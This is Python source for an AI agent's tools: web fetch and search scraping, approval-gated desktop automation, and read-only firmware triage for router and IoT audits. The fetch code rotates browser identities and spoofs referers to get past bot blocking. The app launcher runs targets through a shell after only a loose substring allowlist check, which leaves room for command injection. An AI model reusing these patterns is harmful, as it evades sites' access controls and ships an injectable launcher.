            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status = getattr(resp, "status", 200) or 200
                ctype = (resp.headers.get("Content-Type") or "").lower()
                raw = resp.read(max_bytes)
                _remember_profile(host, profile)
                return status, ctype, raw, profile
        except urllib.error.HTTPError as e:
            last_exc = e
            # 403 / 429 / 503 = "we don't like your shape" — rotate and retry.
            # Other 4xx (404, 410, ...) won't be fixed by a different UA, so
            # bail out immediately.
            if e.code not in (401, 403, 405, 429, 503):
                raise
            # Drop this host's sticky profile — clearly didn't work.
            with _PROFILE_LOCK:
                _PROFILE_BY_HOST.pop(host, None)
            # Small jittered sleep before the next try (avoids back-to-back
            # spam patterns; also gives Cloudflare's edge a tick to forget).
            time.sleep(0.4 + random.random() * 0.6)
            continue
        except Exception as e:
            last_exc = e
            # Network-level failures (DNS, timeout) probably won't be cured
            # by a UA swap, but one retry doesn't cost much.
            time.sleep(0.3 + random.random() * 0.4)
            continue
    # All attempts exhausted — re-raise the last error.
    if last_exc is not None:
        raise last_exc
    raise RuntimeError("fetch failed without a recorded exception")


def fetch_link_preview(url: str) -> dict:
    """Fetch a URL, extract Open Graph / standard meta tags, return a small
    dict the frontend can render in a hover card. Cached per-process so a
    user mousing across the same link 10 times only hits the network once."""
    if not (url.startswith("http://") or url.startswith("https://")):
        return {"error": "url must start with http:// or https://"}
    with _LINK_PREVIEW_CACHE_LOCK:
        cached = _LINK_PREVIEW_CACHE.get(url)
        if cached is not None:
            return cached

    try:
        # Browser-identity rotation w/ retry — see _open_with_rotation().
        # Link previews are short-lived hover popovers, so 2 attempts max
        # to keep the popover snappy.
        _status, ctype, raw, _profile = _open_with_rotation(
            url, timeout=8, max_bytes=256 * 1024, attempts=2, accept_html=True,
        )
        # Only parse text/html. For images / pdfs we return a minimal
        # preview with hostname + content-type so the hover still says
        # *something* useful.
        if "text/html" not in ctype and "application/xhtml" not in ctype:
            try:
                pu = urllib.parse.urlparse(url)
                host = pu.netloc
            except Exception:
                host = ""
            out = {
                "url": url,
                "host": host,
                "title": (url.rsplit("/", 1)[-1] or host),
                "description": ctype.split(";", 1)[0].strip() or "",
                "image": "",
                "site_name": host,
                "content_type": ctype,
            }
            with _LINK_PREVIEW_CACHE_LOCK:
                _LINK_PREVIEW_CACHE[url] = out
            return out
        # Decode best-effort. Many pages declare utf-8 even when they aren't,
        # which is fine since errors='replace' keeps the regexes happy.
        text = raw.decode("utf-8", errors="replace")
    except Exception as e:
        out = {"error": f"{type(e).__name__}: {e}", "url": url}
        # Cache failures briefly too so a dead host doesn't get hammered.
        with _LINK_PREVIEW_CACHE_LOCK:
            _LINK_PREVIEW_CACHE[url] = out
        return out

    meta = _link_preview_extract(text)
    try:
        pu = urllib.parse.urlparse(url)
        host = pu.netloc
        # Resolve relative og:image against the page URL.
        if meta.get("image") and not meta["image"].startswith(("http://", "https://", "data:")):
            meta["image"] = urllib.parse.urljoin(url, meta["image"])
    except Exception:
        host = ""
    out = {
        "url": url,
        "host": host,
        "title": meta.get("title") or host or url,
        "description": meta.get("description") or "",
        "image": meta.get("image") or "",
        "site_name": meta.get("site_name") or host,
    }
    with _LINK_PREVIEW_CACHE_LOCK:
        # Trim oldest if the cache has grown unbounded. dict preserves
        # insertion order so popping items removes the earliest inserts.
        if len(_LINK_PREVIEW_CACHE) >= _LINK_PREVIEW_CACHE_MAX:
            for k in list(_LINK_PREVIEW_CACHE.keys())[: _LINK_PREVIEW_CACHE_MAX // 4]:
                _LINK_PREVIEW_CACHE.pop(k, None)
        _LINK_PREVIEW_CACHE[url] = out
    return out


def tool_web_fetch(args: dict) -> dict:
    url = args.get("url") or ""
    if not (url.startswith("http://") or url.startswith("https://")):
        return {"error": "url must start with http:// or https://"}
    try:
        # 3 attempts with rotating browser identity — see _open_with_rotation().
        # Most "first request 403'd" cases now succeed by attempt 2.
        _status, _ctype, raw, _profile = _open_with_rotation(
            url, timeout=20, max_bytes=1024 * 1024, attempts=3, accept_html=True,
        )
        text = raw.decode("utf-8", errors="replace")
        clean = re.sub(r"<script[\s\S]*?</script>", " ", text, flags=re.IGNORECASE)
        clean = re.sub(r"<style[\s\S]*?</style>", " ", clean, flags=re.IGNORECASE)
        clean = re.sub(r"<[^>]+>", " ", clean)
        clean = re.sub(r"\s+", " ", clean).strip()
        return {"url": url, "text": clean[:16000], "truncated": len(clean) > 16000}
    except Exception as e:
        return {"error": str(e)}


_DDG_RESULT_RE = re.compile(
    r'<a[^>]+class="[^"]*result__a[^"]*"[^>]+href="([^"]+)"[^>]*>(.*?)</a>',
    re.IGNORECASE | re.DOTALL,
)
_DDG_SNIPPET_RE = re.compile(
    r'<a[^>]+class="[^"]*result__snippet[^"]*"[^>]*>(.*?)</a>',
    re.IGNORECASE | re.DOTALL,
)


def _strip_tags(s: str) -> str:
    s = re.sub(r"<[^>]+>", "", s)
    return re.sub(r"\s+", " ", s).strip()


def tool_web_search(args: dict) -> dict:
    """Search the web via DuckDuckGo's no-JS HTML endpoint. No API key.
    Returns a list of {title, url, snippet}. The model usually wants to
    follow up with web_fetch on the top few URLs to read full content."""
    q = (args.get("query") or args.get("q") or "").strip()
    if not q:
        return {"error": "query required"}
    max_results = int(args.get("max_results") or 6)
    max_results = max(1, min(max_results, 20))
    try:
        body = urllib.parse.urlencode({"q": q}).encode()
        # DDG html endpoint is friendly but still 403s plain UAs occasionally.
        # Pretend we navigated from the duckduckgo homepage so the Referer
        # check (yes, they have one) passes.
        _status, _ctype, raw, _profile = _open_with_rotation(
            "https://html.duckduckgo.com/html/",
            timeout=15, max_bytes=2 * 1024 * 1024, attempts=3,
            accept_html=True, referer="https://duckduckgo.com/",
            method="POST", data=body,
            extra_headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        html = raw.decode("utf-8", errors="replace")
    except Exception as e:
        return {"error": f"search failed: {e}"}
    snippets = [_strip_tags(s) for s in _DDG_SNIPPET_RE.findall(html)]
    results = []
    for i, m in enumerate(_DDG_RESULT_RE.finditer(html)):
        url = m.group(1)
        if url.startswith("//"):
            url = "https:" + url
        # ddg wraps outbound links as /l/?uddg=<encoded>
        try:
            pu = urllib.parse.urlparse(url)
            if "duckduckgo.com" in pu.netloc and pu.path.startswith("/l/"):
                qs = urllib.parse.parse_qs(pu.query)
                real = qs.get("uddg", [""])[0]
                if real:
                    url = urllib.parse.unquote(real)
        except Exception:
            pass
        title = _strip_tags(m.group(2))
        snippet = snippets[i] if i < len(snippets) else ""
        if title and url:
            results.append({"title": title, "url": url, "snippet": snippet})
        if len(results) >= max_results:
            break
    return {"query": q, "results": results, "count": len(results)}


# ---- desktop automation ---------------------------------------------------
# Layered defense:
#   1. Feature flag (`desktop_enabled`) must be ON in settings.
#   2. Required libraries must be present (pyautogui / PIL; pygetwindow is nice-to-have).
#   3. Kill switch (`_desktop_panic`) — any pending or new action is refused immediately.
#   4. Rate limit — hard cap on actions per minute regardless of agent intent.
#   5. Allowlist — only apps the user explicitly whitelisted can be launched.
#   6. Approval — every action tool routes through request_approval with full context.
#
# Read-only tools (screenshot/describe/list) run without approval when
# `desktop_auto_approve_read` is on (default), because observation can't
# mutate the machine and constant approval prompts would be unusable.

def _desktop_preflight(require_libs: bool = True) -> dict | None:
    """Return an error dict if desktop tools can't run right now, else None."""
    s = get_settings()
    if not s.get("desktop_enabled"):
        return {"error": "desktop automation is disabled. Enable it in Settings -> Desktop automation."}
    if _desktop_panic.is_set():
        return {"error": "desktop automation is paused (panic/kill switch active). User must resume in Settings."}
    cid = _current_chat_id.get()
    if cid and cid in _chat_desktop_disabled:
        return {"error": "desktop automation is off for this chat. User must re-enable it on the session header."}
    if require_libs and not (_HAVE_PYAUTOGUI and _HAVE_PIL):
        missing = []
        if not _HAVE_PYAUTOGUI:
            missing.append("pyautogui")
        if not _HAVE_PIL:
            missing.append("Pillow")
        return {
            "error": f"missing dependencies: {', '.join(missing)}. Install with: pip install {' '.join(missing)}"
        }
    return None


def _desktop_rate_check() -> dict | None:
    """Sliding-window rate limit. Returns error dict if over limit."""
    s = get_settings()
    cap = int(s.get("desktop_max_actions_per_minute") or 30)
    now = time.time()
    with _desktop_action_lock:
        _desktop_action_times[:] = [t for t in _desktop_action_times if now - t < 60.0]
        if len(_desktop_action_times) >= cap:
            oldest = _desktop_action_times[0]
            wait = 60.0 - (now - oldest)
            return {"error": f"rate limit: {cap} actions/min exceeded. Retry in {wait:.0f}s."}
        _desktop_action_times.append(now)
    return None


def _app_matches_allowlist(name_or_path: str) -> bool:
    """Loose, forgiving match: any token in the allowlist appears in the target.
    Matches on exe basename (minus .exe) AND full path, case-insensitive."""
    s = get_settings()
    allow = [a.strip().lower() for a in (s.get("desktop_app_allowlist") or []) if a.strip()]
    if not allow:
        return False
    target = name_or_path.lower()
    base = os.path.basename(target)
    if base.endswith(".exe"):
        base = base[:-4]
    for entry in allow:
        # entries can be "notepad", "notepad.exe", "C:\\Program Files\\...\\App.exe",
        # or a regex-ish substring. plain substring match covers all cases.
        e = entry[:-4] if entry.endswith(".exe") else entry
        if e in target or e in base or e == base:
            return True
    return False


def _take_screenshot_b64(region: tuple[int, int, int, int] | None = None, max_dim: int = 1600) -> tuple[str, tuple[int, int]]:
    """Capture screen (or region) and return (base64-png, (orig_w, orig_h)).
    Downscales to max_dim for the vision model so we don't flood its context."""
    img = pyautogui.screenshot(region=region) if region else pyautogui.screenshot()
    orig_w, orig_h = img.size
    # shrink for the vision model — reading 4K screenshots burns tokens and
    # LightOnOCR's projector is happy with ~1600px on the long edge
    if max(orig_w, orig_h) > max_dim:
        scale = max_dim / max(orig_w, orig_h)
        img = img.resize((int(orig_w * scale), int(orig_h * scale)), Image.LANCZOS)
    buf = _io.BytesIO()
    img.save(buf, format="PNG")
    return _b64.b64encode(buf.getvalue()).decode(), (orig_w, orig_h)


def _list_windows_raw() -> list[dict]:
    """Return visible top-level windows with title + bbox. Requires pygetwindow."""
    if not _HAVE_PGW:
        return []
    out = []
    try:
        for w in _pgw.getAllWindows():
            title = (w.title or "").strip()
            if not title:
                continue
            try:
                if w.width <= 0 or w.height <= 0:
                    continue
                out.append({
                    "title": title,
                    "x": int(w.left), "y": int(w.top),
                    "w": int(w.width), "h": int(w.height),
                    "active": bool(w.isActive),
                    "minimized": bool(getattr(w, "isMinimized", False)),
                })
            except Exception:
                continue
    except Exception:
        return []
    return out


def _find_window(substring: str):
    """Fuzzy find a single window by title substring (case-insensitive).
    Returns pygetwindow handle or None."""
    if not _HAVE_PGW or not substring:
        return None
    needle = substring.strip().lower()
    try:
        candidates = [w for w in _pgw.getAllWindows() if (w.title or "").lower().find(needle) >= 0]
        candidates = [w for w in candidates if (w.title or "").strip()]
        if not candidates:
            return None
        # prefer active, then largest
        candidates.sort(key=lambda w: (not getattr(w, "isActive", False), -(w.width * w.height)))
        return candidates[0]
    except Exception:
        return None


# ---- desktop tools: read-only (observation) ---------------------------------

def tool_screenshot(args: dict) -> dict:
    """Capture the screen and return a base64 PNG. Read-only."""
    err = _desktop_preflight()
    if err:
        return err
    try:
        region = None
        if all(k in args for k in ("x", "y", "w", "h")):
            region = (int(args["x"]), int(args["y"]), int(args["w"]), int(args["h"]))
        b64, (ow, oh) = _take_screenshot_b64(region)
        return {"ok": True, "image_b64": b64, "width": ow, "height": oh, "note": "PNG, downscaled to ≤1600px long edge if needed"}
    except Exception as e:
        return {"error": f"screenshot failed: {e}"}


def tool_describe_screen(args: dict) -> dict:
    """Take a screenshot, run it through the vision model, return the description.
    This is the agent's 'eyes' — prefer this over raw screenshots so the main
    model stays text-only and VRAM stays efficient."""
    err = _desktop_preflight()
    if err:
        return err
    try:
        region = None
        if all(k in args for k in ("x", "y", "w", "h")):
            region = (int(args["x"]), int(args["y"]), int(args["w"]), int(args["h"]))
        hint = (args.get("hint") or "").strip()
        b64, (ow, oh) = _take_screenshot_b64(region)
        desc = describe_image(b64, hint=hint)
        return {"ok": True, "description": desc, "width": ow, "height": oh}
    except Exception as e:
        return {"error": f"describe_screen failed: {e}"}


def tool_list_windows(args: dict) -> dict:
    """List visible top-level windows."""
    err = _desktop_preflight(require_libs=False)
    if err:
        return err
    if not _HAVE_PGW:
        return {"error": "missing dependency: pygetwindow. Install with: pip install pygetwindow"}
    return {"ok": True, "windows": _list_windows_raw()}


# ---- desktop tools: actions (gated) -----------------------------------------

def _gate_action(title: str, command: str, details: dict | None = None) -> dict | None:
    """Common gate for every action tool: panic -> rate -> approval.
    Returns an error dict if the caller should abort, else None."""
    err = _desktop_preflight()
    if err:
        return err
    rerr = _desktop_rate_check()
    if rerr:
        return rerr
    approval = request_approval(title=title, command=command, details=details or {})
    if approval.get("decision") != "approve":
        return {"error": f"user denied action ({approval.get('status')})"}
    if _desktop_panic.is_set():
        return {"error": "panic/kill switch was flipped after approval — action aborted."}
    return None


def tool_desktop_launch_app(args: dict) -> dict:
    """Launch an application. Only apps in the user's allowlist are permitted."""
    target = (args.get("name") or args.get("path") or "").strip()
    if not target:
        return {"error": "name or path required"}
    if not _app_matches_allowlist(target):
        s = get_settings()
        allow = s.get("desktop_app_allowlist") or []
        return {
            "error": (
                f"'{target}' is not in the desktop allowlist. "
                f"User must add it in Settings -> Desktop automation first. "
                f"Current allowlist: {allow or '(empty)'}"
            )
        }
    gate_err = _gate_action(
        title="Launch app (desktop automation)",
        command=target,
        details={"kind": "desktop.launch", "target": target},
    )
    if gate_err:
        return gate_err
    try:
        # shell=True lets 'notepad' / 'chrome' resolve from PATH/App Paths
        subprocess.Popen(target, shell=True)
        return {"ok": True, "launched": target}
    except Exception as e:
        return {"error": str(e)}


def tool_desktop_focus_window(args: dict) -> dict:
    """Bring a window to the foreground by title substring."""
    err = _desktop_preflight(require_libs=False)
    if err:
        return err
    if not _HAVE_PGW:
        return {"error": "missing dependency: pygetwindow. Install with: pip install pygetwindow"}
    title = (args.get("title") or "").strip()
    if not title:
        return {"error": "title substring required"}
    w = _find_window(title)
    if not w:
        return {"error": f"no visible window matches '{title}'"}
    gate_err = _gate_action(
        title="Focus window",
        command=f'focus: "{w.title}"',
        details={"kind": "desktop.focus", "title": w.title},
    )
    if gate_err:
        return gate_err
    try:
        if getattr(w, "isMinimized", False):
            w.restore()
        w.activate()
        return {"ok": True, "focused": w.title}
    except Exception as e:
        return {"error": str(e)}


def tool_desktop_click(args: dict) -> dict:
    """Move the mouse to (x, y) and click. Coordinates are in screen pixels.
    The agent should derive coords from describe_screen + list_windows, not guess."""
    try:
        x = int(args["x"])
        y = int(args["y"])
    except Exception:
        return {"error": "x and y (screen pixel coords) required"}
    button = (args.get("button") or "left").lower()
    if button not in ("left", "right", "middle"):
        return {"error": "button must be left, right, or middle"}
    clicks = int(args.get("clicks") or 1)
    if not (1 <= clicks <= 3):
        return {"error": "clicks must be 1..3"}
    gate_err = _gate_action(
        title=f"Click at ({x}, {y})",
        command=f"{button} click x{clicks} at ({x}, {y})",
        details={"kind": "desktop.click", "x": x, "y": y, "button": button, "clicks": clicks},
    )
    if gate_err:
        return gate_err
    try:
        pyautogui.click(x=x, y=y, clicks=clicks, button=button)
        return {"ok": True, "clicked": [x, y], "button": button, "clicks": clicks}
    except Exception as e:
        return {"error": str(e)}


def tool_desktop_type_text(args: dict) -> dict:
    """Type a string into the focused window. No special keys — use press_keys for those."""
    text = args.get("text") or ""
    if not isinstance(text, str) or not text:
        return {"error": "text (string) required"}
    if len(text) > 2000:
        return {"error": "text too long (>2000 chars). Split into smaller chunks."}
    preview = text if len(text) <= 200 else (text[:200] + "…")
    gate_err = _gate_action(
        title="Type text (keyboard)",
        command=f"type: {preview}",
        details={"kind": "desktop.type", "text": text, "length": len(text)},
    )
    if gate_err:
        return gate_err
    try:
        pyautogui.typewrite(text, interval=0.01)
        return {"ok": True, "typed_chars": len(text)}
    except Exception as e:
        return {"error": str(e)}


def tool_desktop_press_keys(args: dict) -> dict:
    """Press a key combo like 'ctrl+s', 'alt+tab', 'enter', 'win'.
    For a single key use `keys: 'enter'`; for combos use `keys: 'ctrl+s'`."""
    keys = args.get("keys") or ""
    if not isinstance(keys, str) or not keys.strip():
        return {"error": "keys (string like 'ctrl+s' or 'enter') required"}
    combo = [k.strip().lower() for k in keys.split("+") if k.strip()]
    if not combo:
        return {"error": "no keys parsed"}
    # pyautogui hotkey whitelist — block anything not a known key to avoid surprises
    allowed = set(pyautogui.KEYBOARD_KEYS) if _HAVE_PYAUTOGUI else set()
    bad = [k for k in combo if k not in allowed and len(k) != 1]
    if bad:
        return {"error": f"unknown keys: {bad}. See pyautogui.KEYBOARD_KEYS."}
    gate_err = _gate_action(
        title="Press keys",
        command=f"hotkey: {'+'.join(combo)}",
        details={"kind": "desktop.keys", "combo": combo},
    )
    if gate_err:
        return gate_err
    try:
        if len(combo) == 1:
            pyautogui.press(combo[0])
        else:
            pyautogui.hotkey(*combo)
        return {"ok": True, "pressed": "+".join(combo)}
    except Exception as e:
        return {"error": str(e)}


def tool_desktop_close_window(args: dict) -> dict:
    """Close a window by title substring. Requires approval."""
    err = _desktop_preflight(require_libs=False)
    if err:
        return err
    if not _HAVE_PGW:
        return {"error": "missing dependency: pygetwindow. Install with: pip install pygetwindow"}
    title = (args.get("title") or "").strip()
    if not title:
        return {"error": "title substring required"}
    w = _find_window(title)
    if not w:
        return {"error": f"no visible window matches '{title}'"}
    gate_err = _gate_action(
        title="Close window",
        command=f'close: "{w.title}"',
        details={"kind": "desktop.close", "title": w.title},
    )
    if gate_err:
        return gate_err
    try:
        w.close()
        return {"ok": True, "closed": w.title}
    except Exception as e:
        return {"error": str(e)}


# ============================================================================
# Firmware analysis tools — read-only triage on binaries dropped in the
# workspace. Designed for first-pass router / IoT firmware audits. No system
# tools, no shells. Pure Python where possible, optional pip libs elsewhere.
# Extraction is the only destructive op and uses the standard approval card.
# ============================================================================

# Magic-byte signature table for tool_file_inspect. Only formats we expect
# to see in consumer firmware. Order matters — longer signatures first.
_FW_MAGIC_TABLE = [
    (b"\x1f\x8b\x08", "gzip"),
    (b"PK\x03\x04", "zip"),
    (b"PK\x05\x06", "zip (empty)"),
    (b"7z\xbc\xaf\x27\x1c", "7z"),
    (b"\xfd7zXZ\x00", "xz"),
    (b"BZh", "bzip2"),
    (b"hsqs", "squashfs (le)"),
    (b"sqsh", "squashfs (be)"),
    (b"\x85\x19\x03\x20", "jffs2 (le)"),
    (b"\x19\x85\x20\x03", "jffs2 (be)"),
    (b"\x45\x3d\xcd\x28", "cramfs (le)"),
    (b"\x28\xcd\x3d\x45", "cramfs (be)"),
    (b"HDR0", "trx (router header)"),
    (b"\x7fELF", "ELF"),
    (b"MZ", "PE/DOS executable"),
    (b"\xca\xfe\xba\xbe", "Java class / Mach-O fat"),
    (b"070701", "cpio (newc ascii)"),
    (b"070707", "cpio (binary)"),
]


def _fw_identify_magic(data: bytes) -> str | None:
    for sig, name in _FW_MAGIC_TABLE:
        if data.startswith(sig):
            return name
    # ustar lives at offset 257 in a tar header
    if len(data) >= 263 and data[257:262] == b"ustar":
        return "tar"
    return None


def _fw_check_path(path: str, must_exist: bool = True) -> tuple[str, dict | None]:
    """Resolve + validate a workspace path. Returns (resolved, error_or_None)."""
    p = normalize_path(path or "")
    if not p:
        return "", {"error": "missing path"}
    if must_exist and not os.path.exists(p):
        return p, {"error": f"not found: {p}"}
    if is_blocked_path(p):
        return p, {"error": "path blocked (Windows/System32)"}
    if not is_in_workspace(p):
        return p, {"error": "path outside workspace. Add folder in Workspace panel."}
    return p, None


# Signatures scanned for at any offset in tool_binwalk_scan. Kept short and
# unambiguous to minimize false positives. This isn't binwalk's full database
# — just the formats that actually show up in consumer router firmware.
_FW_SCAN_SIGNATURES: list[tuple[bytes, str]] = [
    (b"\x1f\x8b\x08", "gzip"),
    (b"BZh9", "bzip2 (level 9)"),
    (b"\xfd7zXZ\x00", "xz"),
    (b"7z\xbc\xaf\x27\x1c", "7z"),
    (b"PK\x03\x04", "zip (local file)"),
    (b"PK\x05\x06", "zip (end of central dir)"),
    (b"hsqs", "squashfs (le)"),
    (b"sqsh", "squashfs (be)"),
    (b"\x85\x19\x03\x20", "jffs2 (le)"),
    (b"\x19\x85\x20\x03", "jffs2 (be)"),
    (b"\x45\x3d\xcd\x28", "cramfs (le)"),
    (b"\x28\xcd\x3d\x45", "cramfs (be)"),
    (b"\x7fELF", "ELF executable"),
    (b"HDR0", "trx router header"),
    (b"-rom1fs-", "romfs"),
    (b"070701", "cpio (newc ascii)"),
    (b"070707", "cpio (binary)"),
    (b"UBI#", "UBI image"),
    (b"!<arch>", "ar archive"),
]


def tool_binwalk_scan(args: dict) -> dict:
    """Scan a binary for known magic-byte signatures at any offset.
    Pure-Python — covers gzip, bzip2, xz, 7z, zip, squashfs, jffs2,
    cramfs, ELF, TRX, romfs, cpio, UBI, ar. Returns sorted offset table."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    max_results = max(1, min(int(args.get("max_results") or 200), 1000))
    max_bytes = max(1024, min(int(args.get("max_bytes") or 64 * 1024 * 1024),
                              256 * 1024 * 1024))
    try:
        size = os.path.getsize(path)
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        truncated = size > len(data)
        results: list[dict] = []
        for sig, name in _FW_SCAN_SIGNATURES:
            start = 0
            while True:
                idx = data.find(sig, start)
                if idx < 0:
                    break
                results.append({
                    "offset": idx,
                    "offset_hex": f"0x{idx:x}",
                    "description": name,
                })
                if len(results) >= max_results:
                    break
                start = idx + 1
            if len(results) >= max_results:
                break
        results.sort(key=lambda r: r["offset"])
        return {
            "path": path,
            "size": size,
            "scanned_bytes": len(data),
            "truncated": truncated,
            "count": len(results),
            "matches": results,
        }
    except Exception as e:
        return {"error": str(e)}


def tool_strings_dump(args: dict) -> dict:
    """Extract printable ASCII string runs from a binary file. Optional
    regex filter. Caps reads at max_bytes so large firmwares stay sane."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    min_len = max(4, int(args.get("min_length") or 8))
    pattern = args.get("pattern")
    max_results = max(1, min(int(args.get("max_results") or 500), 5000))
    max_bytes = max(1024, min(int(args.get("max_bytes") or 16 * 1024 * 1024),
                              64 * 1024 * 1024))
    try:
        rx = re.compile(pattern) if pattern else None
    except re.error as e:
        return {"error": f"bad pattern: {e}"}
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes)
        run_re = re.compile(rb"[\x20-\x7e]{%d,}" % min_len)
        found: list[dict] = []
        for m in run_re.finditer(data):
            s = m.group(0).decode("ascii", errors="replace")
            if rx and not rx.search(s):
                continue
            found.append({"offset": m.start(), "string": s})
            if len(found) >= max_results:
                break
        return {
            "path": path,
            "scanned_bytes": len(data),
            "truncated": len(data) >= max_bytes,
            "match_count": len(found),
            "matches": found,
        }
    except Exception as e:
        return {"error": str(e)}


def tool_file_inspect(args: dict) -> dict:
    """Identify a file by magic bytes. For ELF binaries, also report
    architecture, type, entry point, interpreter, and strip status."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    try:
        size = os.path.getsize(path)
        with open(path, "rb") as f:
            head = f.read(512)
        magic = _fw_identify_magic(head)
        info: dict = {
            "path": path,
            "size": size,
            "magic": magic or "unknown",
            "header_hex": head[:32].hex(),
        }
        if magic == "ELF" and _HAVE_ELFTOOLS:
            try:
                with open(path, "rb") as f:
                    elf = ELFFile(f)
                    interp_section = elf.get_section_by_name(".interp")
                    info["elf"] = {
                        "class": elf.header["e_ident"]["EI_CLASS"],
                        "data": elf.header["e_ident"]["EI_DATA"],
                        "machine": elf.header["e_machine"],
                        "type": elf.header["e_type"],
                        "entry": hex(elf.header["e_entry"]),
                        "stripped": elf.get_section_by_name(".symtab") is None,
                        "interpreter": (
                            interp_section.data().decode(errors="replace").rstrip("\x00")
                            if interp_section else None
                        ),
                    }
            except Exception as e:
                info["elf_error"] = str(e)
        return info
    except Exception as e:
        return {"error": str(e)}


def tool_read_bytes(args: dict) -> dict:
    """Read raw bytes at an offset. Returns hex + printable ASCII view.
    Use to inspect a header or an offset surfaced by binwalk_scan."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    offset = max(0, int(args.get("offset") or 0))
    length = max(1, min(int(args.get("length") or 256), 4096))
    try:
        with open(path, "rb") as f:
            f.seek(offset)
            data = f.read(length)
        ascii_view = "".join(chr(b) if 32 <= b < 127 else "." for b in data)
        return {
            "path": path,
            "offset": offset,
            "length": len(data),
            "hex": data.hex(),
            "ascii": ascii_view,
        }
    except Exception as e:
        return {"error": str(e)}


def tool_find_files(args: dict) -> dict:
    """Recursive glob under a directory with optional size cap. Good for
    triaging extracted firmware roots without reading everything."""
    root, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isdir(root):
        return {"error": f"not a directory: {root}"}
    pattern = (args.get("pattern") or "*").strip() or "*"
    max_size = int(args.get("max_size") or 0)  # 0 = no cap
    max_results = max(1, min(int(args.get("max_results") or 500), 5000))
    try:
        matches: list[dict] = []
        for p in Path(root).rglob(pattern):
            if not p.is_file():
                continue
            try:
                sz = p.stat().st_size
            except OSError:
                continue
            if max_size and sz > max_size:
                continue
            matches.append({"path": str(p), "size": sz})
            if len(matches) >= max_results:
                break
        return {"root": root, "count": len(matches), "matches": matches}
    except Exception as e:
        return {"error": str(e)}


def tool_extract_archive(args: dict) -> dict:
    """Auto-detect format and extract gzip/tar/zip/xz/bzip2/squashfs into
    a sandbox subdirectory next to the source. Destructive — gated by an
    approval card. Refuses path-traversal in archive members."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    src = Path(path)
    dest_name = (args.get("dest_name") or f"{src.stem}_extracted").strip()
    if "/" in dest_name or "\\" in dest_name or ".." in dest_name:
        return {"error": "dest_name must be a single folder name (no slashes)"}
    dest = src.parent / dest_name
    if dest.exists() and not args.get("overwrite"):
        return {"error": f"destination exists: {dest}. Pass overwrite:true or pick a new dest_name."}

    approval = request_approval(
        title="Extract archive",
        command=f'extract: "{src.name}" -> "{dest.name}"',
        details={"kind": "extract_archive", "source": str(src), "dest": str(dest)},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied extraction ({approval.get('status')})"}

    import gzip as _gz
    import tarfile as _tar
    import zipfile as _zip
    import lzma as _xz
    import bz2 as _bz

    def _safe_member(name: str) -> str | None:
        n = (name or "").replace("\\", "/").lstrip("/")
        if not n or ".." in n.split("/"):
            return None
        return n

    try:
        with open(src, "rb") as f:
            head = f.read(512)
        magic = _fw_identify_magic(head) or ""

        if dest.exists():
            shutil.rmtree(dest)
        dest.mkdir(parents=True)

        files_written = 0

        if magic == "gzip":
            # gzip usually wraps a tar in firmware contexts
            with _gz.open(src, "rb") as gz:
                inner_head = gz.read(512)
            if len(inner_head) >= 263 and inner_head[257:262] == b"ustar":
                with _gz.open(src, "rb") as gz, _tar.open(fileobj=gz, mode="r:") as tar:
                    for m in tar.getmembers():
                        n = _safe_member(m.name)
                        if not n:
                            continue
                        m.name = n
                        tar.extract(m, dest)
                        files_written += 1
            else:
                out = dest / (src.stem + ".bin")
                with _gz.open(src, "rb") as gz, open(out, "wb") as o:
                    shutil.copyfileobj(gz, o)
                files_written = 1
        elif magic == "tar":
            with _tar.open(src, "r:") as tar:
                for m in tar.getmembers():
                    n = _safe_member(m.name)
                    if not n:
                        continue
                    m.name = n
                    tar.extract(m, dest)
                    files_written += 1
        elif magic.startswith("zip"):
            with _zip.ZipFile(src) as z:
                for info in z.infolist():
                    n = _safe_member(info.filename)
                    if not n:
                        continue
                    info.filename = n
                    z.extract(info, dest)
                    files_written += 1
        elif magic == "xz":
            out = dest / (src.stem + ".bin")
            with _xz.open(src, "rb") as xz, open(out, "wb") as o:
                shutil.copyfileobj(xz, o)
            files_written = 1
        elif magic == "bzip2":
            out = dest / (src.stem + ".bin")
            with _bz.open(src, "rb") as bz, open(out, "wb") as o:
                shutil.copyfileobj(bz, o)
            files_written = 1
        elif magic.startswith("squashfs"):
            if not _HAVE_SQUASHFS:
                return {"error": "squashfs detected but PySquashfsImage not installed."}
            with SquashFsImage.from_file(str(src)) as img:
                for entry in img:
                    if getattr(entry, "is_dir", False):
                        continue
                    if not getattr(entry, "is_file", True):
                        continue
                    rel = (getattr(entry, "path", "") or "").lstrip("/")
                    n = _safe_member(rel)
                    if not n:
                        continue
                    out = dest / n
                    out.parent.mkdir(parents=True, exist_ok=True)
                    try:
                        data = entry.read_bytes()
                    except Exception:
                        # API drift fallback
                        with entry.open() as fp:  # type: ignore[attr-defined]
                            data = fp.read()
                    with open(out, "wb") as o:
                        o.write(data)
                    files_written += 1
        else:
            shutil.rmtree(dest, ignore_errors=True)
            return {"error": f"unsupported or unrecognized format (magic={magic or 'unknown'})"}

        return {
            "ok": True,
            "source": str(src),
            "dest": str(dest),
            "files_written": files_written,
            "magic": magic,
        }
    except Exception as e:
        try:
            shutil.rmtree(dest, ignore_errors=True)
        except Exception:
            pass
        return {"error": str(e)}


def tool_carve_file(args: dict) -> dict:
    """Carve a byte range [offset, offset+length] out of a source file into
    a new file in the same directory. Use when binwalk_scan surfaces an
    embedded gzip/squashfs/etc inside a custom container (e.g. the 0xd00dfe
    TP-Link/ASUS .pkgtb wrapper) — carve the range, THEN run extract_archive
    or extract_squashfs on the carved file. length=0 carves to EOF."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    src = Path(path)
    try:
        size = os.path.getsize(src)
    except OSError as e:
        return {"error": str(e)}
